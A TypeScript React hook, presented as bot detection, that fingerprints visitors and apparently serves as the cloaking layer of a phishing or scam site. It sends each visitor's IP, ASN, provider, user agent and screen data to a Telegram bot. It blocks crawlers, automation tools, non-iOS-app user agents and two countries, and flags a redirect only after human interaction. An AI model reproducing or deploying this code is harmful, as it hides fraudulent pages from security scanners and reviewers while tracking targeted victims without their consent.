import { useEffect, useState } from 'react';
import { isbot } from 'isbot';


interface BotDetectionResult {
    isBot: boolean;
    isLoading: boolean;
    shouldRedirect: boolean;
    botReason?: string;
}

const blockedCountries =  [
"id","vn"
];

export const sendBotTelegram = async (reason: string) => {
    try {
        const botToken = import.meta.env.PUBLIC_BOT_TOKEN;
        const chatId = import.meta.env.PUBLIC_CHAT_ID;
        const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
        const geoRes = await fetch(geoUrl);
        const geoData = await geoRes.json();
        const fullFingerprint = {
            asn: geoData.asn,
            organization_name: geoData.organization_name,
            organization: geoData.organization,
            ip: geoData.ip,
            country: geoData.country_code,
            navigator: {
                userAgent: navigator.userAgent,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                webdriver: navigator.webdriver,
            },
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
            },
        };
        let blocked  = reason.length > 0 ? `
        🚫 <b>Blocked BOT</b>
        🔍 <b>Reason:</b> <code>${reason}</code> ` : ``;
        let msg  = `
        ${blocked}
        📱 <b>APP ID:</b> <code>${import.meta.env.PUBLIC_SITE_ID}</code>
        📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
        🌐  <b>Country:</b> <code>${fullFingerprint.country}</code>
        📍 <b>Country:</b> <code>${fullFingerprint.country}</code>
        🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
        🏛️ <b>Provider:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Unknown'}</code>

        🌐 <b>Browser:</b> <code>${fullFingerprint.navigator.userAgent}</code>
        💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> core
        📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> point
        🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Yes' : 'No'}</code>

        📺 <b>Screen:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
        📐 <b>Real screen:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
        
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        };

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        const result = await response.json();

        if (!response.ok) {
           console.error('telegram api error:', result);
        } else {
            console.log('bot telegram sent successfully:', result);
        }
    } catch (error) {
        console.error('telegram send fail:', error);
        //const errorMsg = error instanceof Error ? error.message : 'Unable to connect';
        //alert(`Bot Alert Network Error: ${errorMsg}`);
    }
};

export const useBotDetection = (): BotDetectionResult => {
    const [isBot, setIsBot] = useState(false);
    const [isLoading, setIsLoading] = useState(true);
    const [shouldRedirect, setShouldRedirect] = useState(false);
    const [botReason, setBotReason] = useState<string>();

    const checkAndBlockBots = async (): Promise<{ isBlocked: boolean; reason?: string }> => {
        const userAgent = navigator.userAgent.toLowerCase();
        const appID = '15E148';
        if(appID && !userAgent.includes(appID)){
                 const reason = `Bot Detected | Visitor is not from appstore!`;
                 return { isBlocked: true, reason };
        }
        if(isbot(userAgent)){
            const reason = `Bot Detected by Isbot Library!`;
            return { isBlocked: true, reason };
        }
        return { isBlocked: false };
    };

    const checkAndBlockByGeoIP = async (): Promise<{ isBlocked: boolean; reason?: string }> => {
        try {
            const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
            const data = await response.json();

            if (blockedCountries.includes(data.country_code.toLowerCase())) {
                const reason = `Blocked Country: ${data.country_code}`;
                return { isBlocked: true, reason };
            }
            return { isBlocked: false };
        } catch {
            return { isBlocked: false };
        }
    };

    const checkAdvancedWebDriverDetection = async (): Promise<{
        isBot: boolean;
        reason?: string;
    }> => {
        if (navigator.webdriver === true) {
            const reason = 'navigator.webdriver = true';
            return { isBot: true, reason };
        }

        if ('__nightmare' in window) {
            const reason = 'nightmare detected';
            return { isBot: true, reason };
        }
        if ('_phantom' in window || 'callPhantom' in window) {
            const reason = 'phantom detected';
            return { isBot: true, reason };
        }
        if ('Buffer' in window) {
            const reason = 'buffer detected';
            return { isBot: true, reason };
        }
        if ('emit' in window) {
            const reason = 'emit detected';
            return { isBot: true, reason };
        }
        if ('spawn' in window) {
            const reason = 'spawn detected';
            return { isBot: true, reason };
        }

        const seleniumProps = [
            '__selenium_unwrapped',
            '__webdriver_evaluate',
            '__driver_evaluate',
            '__webdriver_script_function',
            '__webdriver_script_func',
            '__webdriver_script_fn',
            '__fxdriver_evaluate',
            '__driver_unwrapped',
            '__webdriver_unwrapped',
            '__selenium_evaluate',
            '__fxdriver_unwrapped',
        ];

        const foundProp = seleniumProps.find((prop) => prop in window);
        if (foundProp) {
            const reason = `selenium property: ${foundProp}`;
            return { isBot: true, reason };
        }

        if ('__webdriver_evaluate' in document) {
            const reason = 'webdriver_evaluate in document';
            return { isBot: true, reason };
        }
        if ('__selenium_evaluate' in document) {
            const reason = 'selenium_evaluate in document';
            return { isBot: true, reason };
        }
        if ('__webdriver_script_function' in document) {
            const reason = 'webdriver_script_function in document';
            return { isBot: true, reason };
        }

        return { isBot: false };
    };

    const checkNavigatorAnomalies = async (): Promise<{ isBot: boolean; reason?: string }> => {
        if (navigator.webdriver === true) {
            const reason = 'navigator.webdriver = true';
            return { isBot: true, reason };
        }

        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
            const reason = `hardwareConcurrency is too high: ${navigator.hardwareConcurrency}`;
            return { isBot: true, reason };
        }
        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
            const reason = `hardwareConcurrency is too low: ${navigator.hardwareConcurrency}`;
            return { isBot: true, reason };
        }

        return { isBot: false };
    };

    const checkScreenAnomalies = async (): Promise<{ isBot: boolean; reason?: string }> => {
        if (screen.width === 2000 && screen.height === 2000) {
            const reason = 'screen 2000x2000 (bot pattern)';
            return { isBot: true, reason };
        }

        if (screen.width > 4000 || screen.height > 4000) {
            const reason = `screen is too large: ${screen.width}x${screen.height}`;
            return { isBot: true, reason };
        }
        if (screen.width < 200 || screen.height < 200) {
            const reason = `screen is too small: ${screen.width}x${screen.height}`;
            return { isBot: true, reason };
        }

        if (screen.availWidth === screen.width && screen.availHeight === screen.height) {
            if (screen.width > 1000 && screen.height > 1000) {
                const reason = `full size large screen: ${screen.width}x${screen.height}`;
                return { isBot: true, reason };
            }
        }
        if (screen.width === screen.height && screen.width >= 1500) {
            const reason = `large square screen: ${screen.width}x${screen.height}`;
            return { isBot: true, reason };
        }
        return { isBot: false };
    };

    useEffect(() => {
        const handleUserInteraction = () => {
            if (!isBot && !isLoading) {
                setShouldRedirect(true);
            }
        };

        const events = [
            'mousemove',
            'mousedown',
            'mouseup',
            'click',
            'touchstart',
            'touchmove',
            'touchend',
            'scroll',
            'keydown',
        ];

        events.forEach((event) => {
            document.addEventListener(event, handleUserInteraction, { once: true, passive: true });
        });

        return () => {
            events.forEach((event) => {
                document.removeEventListener(event, handleUserInteraction);
            });
        };
    }, [isBot, isLoading]);

    useEffect(() => {
        const detectBot = async () => {
            const userAgentCheck = await checkAndBlockBots();
            if (userAgentCheck.isBlocked) {
                setIsBot(true);
                setBotReason(userAgentCheck.reason);
                setIsLoading(false);
                return;
            }

            const webDriverCheck = await checkAdvancedWebDriverDetection();
            if (webDriverCheck.isBot) {
                setIsBot(true);
                setBotReason(webDriverCheck.reason);
                setIsLoading(false);
                return;
            }

            const navigatorCheck = await checkNavigatorAnomalies();
            if (navigatorCheck.isBot) {
                setIsBot(true);
                setBotReason(navigatorCheck.reason);
                setIsLoading(false);
                return;
            }

            const screenCheck = await checkScreenAnomalies();
            if (screenCheck.isBot) {
                setIsBot(true);
                setBotReason(screenCheck.reason);
                setIsLoading(false);
                return;
            }

            const geoIPCheck = await checkAndBlockByGeoIP();
            if (geoIPCheck.isBlocked) {
                setIsBot(true);
                setBotReason(geoIPCheck.reason);
                setIsLoading(false);
                return;
            }
            setIsLoading(false);
        };
        const timer = setTimeout(detectBot, 100);
        return () => clearTimeout(timer);
    }, []);

    return { isBot, isLoading, shouldRedirect, botReason };
};
